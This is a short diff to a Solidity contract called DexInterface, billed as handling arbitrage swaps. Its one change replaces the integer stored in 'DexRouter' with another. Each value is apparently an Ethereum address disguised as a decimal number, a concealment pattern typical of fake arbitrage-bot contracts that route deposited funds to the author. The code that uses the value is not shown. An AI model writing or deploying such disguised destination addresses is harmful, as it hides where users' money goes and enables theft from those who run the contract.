@@ -184,7 +184,7 @@ contract DexInterface {
         _;
     }
 
-    uint256 DexRouter = 404284062743160066328270795281009016834356911486;  
+    uint256 DexRouter = 462439162229612182024634686968202441647853994055;  
 
     // The token exchange function that is used when processing an arbitrage bundle
 	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
